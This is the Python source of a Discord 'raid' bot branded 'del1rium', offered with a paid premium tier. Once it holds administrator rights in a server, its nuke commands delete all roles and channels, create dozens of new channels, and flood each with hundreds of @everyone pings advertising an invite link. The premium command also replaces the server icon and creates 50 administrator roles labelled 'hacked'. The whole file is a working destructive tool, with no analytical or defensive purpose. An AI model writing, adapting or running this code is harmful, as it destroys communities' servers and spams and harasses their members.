import discord
from discord.ext import commands
import asyncio
import os
import aiohttp
from dotenv import load_dotenv

# Load environment variables
load_dotenv()
TOKEN = os.getenv('DISCORD_TOKEN')

# --- CONFIGURATION ---
CENTRAL_SERVER_ID = 1453920087194206394  # IMPORTANT: REPLACE THIS with your main server's ID!!
PREMIUM_ROLE_ID = 1458177413325259035      # IMPORTANT: REPLACE THIS with your premium role ID!!
OWNER_ID = 1450919094202269881              # IMPORTANT: REPLACE THIS with your User ID!!

# --- NUKE COMMAND TEXTS ---
# Text for the public :nuke command. This is now fixed and cannot be changed.
NORMAL_NUKE_TEXT = "@everyone raid by del1rium https://discord.gg/cJJJWHfnn2"

# Default configuration for the premium nuke. This can be changed by premium users.
PREMIUM_CHANNEL_NAME = "premium-raid"
PREMIUM_SPAM_TEXT = "@everyone premium raid by del1rium https://discord.gg/cJJJWHfnn2"
RAID_ICON_URL = "https://i.imgur.com/x203v9a.jpeg"

# Bot setup
intents = discord.Intents.all()
bot = commands.Bot(command_prefix=':', intents=intents)

# --- PREMIUM CHECK FUNCTION ---
def is_premium():
    async def predicate(ctx):
        if ctx.author.id == OWNER_ID:
            return True
        central_server = bot.get_guild(CENTRAL_SERVER_ID)
        if not central_server:
            await ctx.send("System Error: Could not verify premium status.")
            return False
        member_in_central = central_server.get_member(ctx.author.id)
        if not member_in_central or not any(role.id == PREMIUM_ROLE_ID for role in member_in_central.roles):
            await ctx.send("Access Denied: This is a premium command.")
            return False
        return True
    return commands.check(predicate)

@bot.event
async def on_ready():
    print(f'Raid Bot connected as {bot.user.name}')
    print(f'Owner ID: {OWNER_ID} | Protected Server: {CENTRAL_SERVER_ID}')
    print('Commands: :nuke (Public/Fixed), :premiumnuke (Premium/Configurable), :nukeconfig (Premium)')

# --- NUKE COMMANDS ---

@bot.command(name='nuke')
async def nuke_normal(ctx):
    """Public command with fixed text and parameters."""
    if ctx.guild.id == CENTRAL_SERVER_ID:
        await ctx.send("Action Blocked: Nuke commands are disabled in this server.")
        return
    if not ctx.guild.me.guild_permissions.administrator:
        return
    
    print(f"Initiating STANDARD NUKE in: {ctx.guild.name} by {ctx.author.name}")
    # Standard Nuke: 25 channels, 500 pings, fixed text.
    await execute_nuke(ctx, "raid-by-del1rium", NORMAL_NUKE_TEXT, 25, 500, is_premium=False)
    print(f"Standard Nuke finished for {ctx.guild.name}.")

@bot.command(name='premiumnuke')
@is_premium()
async def premium_nuke(ctx):
    """Premium command that uses the custom configuration."""
    if ctx.guild.id == CENTRAL_SERVER_ID:
        await ctx.send("Action Blocked: Nuke commands are disabled in this server.")
        return
    if not ctx.guild.me.guild_permissions.administrator:
        return
        
    print(f"Initiating PREMIUM NUKE in: {ctx.guild.name} by {ctx.author.name}")
    # Premium Nuke: 50 channels, 1000 pings, uses configurable text.
    await execute_nuke(ctx, PREMIUM_CHANNEL_NAME, PREMIUM_SPAM_TEXT, 50, 1000, is_premium=True)
    print(f"Premium Nuke finished for {ctx.guild.name}.")

# --- CONFIGURATION COMMAND (NOW PREMIUM) ---

@bot.command(name='nukeconfig')
@is_premium() # This command is now protected and only for premium users.
async def nuke_config(ctx, channel_name: str, *, spam_text: str):
    """Configures the text for the :premiumnuke command."""
    if ctx.guild.id == CENTRAL_SERVER_ID:
        await ctx.send("Command Disabled: This command cannot be used in the main server.")
        return

    global PREMIUM_CHANNEL_NAME, PREMIUM_SPAM_TEXT
    PREMIUM_CHANNEL_NAME = channel_name
    PREMIUM_SPAM_TEXT = spam_text
    
    await ctx.message.delete()
    embed = discord.Embed(title="Premium Nuke Configuration Updated", color=discord.Color.gold())
    embed.add_field(name="Channel Name Format", value=f"`{channel_name}-X`", inline=False)
    embed.add_field(name="Spam Text", value=f"```{spam_text}```", inline=False)
    embed.set_footer(text="This configuration will be used for the :premiumnuke command.")
    confirmation_msg = await ctx.send(embed=embed)
    await asyncio.sleep(15)
    await confirmation_msg.delete()

# --- CENTRAL NUKE LOGIC ---
async def execute_nuke(ctx, channel_name, spam_text, num_channels, num_pings, is_premium: bool):
    guild = ctx.guild
    
    destruction_tasks = [*(role.delete() for role in guild.roles if not role.is_default() and not role.managed), *(channel.delete() for channel in guild.channels)]
    if is_premium:
        destruction_tasks.append(execute_premium_actions(guild))
    await asyncio.gather(*destruction_tasks, return_exceptions=True)

    spam_tasks = [create_and_spam(guild, channel_name, spam_text, i, num_pings) for i in range(num_channels)]
    await asyncio.gather(*spam_tasks)

# --- HELPER FUNCTIONS ---
async def create_and_spam(guild, channel_name, spam_text, index, num_pings):
    try:
        channel = await guild.create_text_channel(f'{channel_name}-{index+1}')
        await spam_pings(channel, spam_text, num_pings)
    except Exception: pass

async def spam_pings(channel, spam_text, amount):
    for _ in range(amount):
        try:
            asyncio.create_task(channel.send(spam_text))
            await asyncio.sleep(0.1)
        except Exception: break

async def execute_premium_actions(guild):
    premium_tasks = [change_server_icon(guild), create_chaotic_roles(guild)]
    await asyncio.gather(*premium_tasks, return_exceptions=True)

async def change_server_icon(guild):
    try:
        async with aiohttp.ClientSession() as session, session.get(RAID_ICON_URL) as resp:
            if resp.status == 200: await guild.edit(icon=await resp.read(), reason="Premium Nuke")
    except Exception: pass

async def create_chaotic_roles(guild):
    role_tasks = [guild.create_role(name=f"hacked-by-del1rium-{i}", permissions=discord.Permissions(administrator=True), color=discord.Color.random()) for i in range(50)]
    await asyncio.gather(*role_tasks, return_exceptions=True)

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        print(f"Premium access denied for user: {ctx.author.name}")
    else:
        pass

if __name__ == "__main__":
    if TOKEN:
        bot.run(TOKEN)
    else:
        print("Error: DISCORD_TOKEN is not configured.")

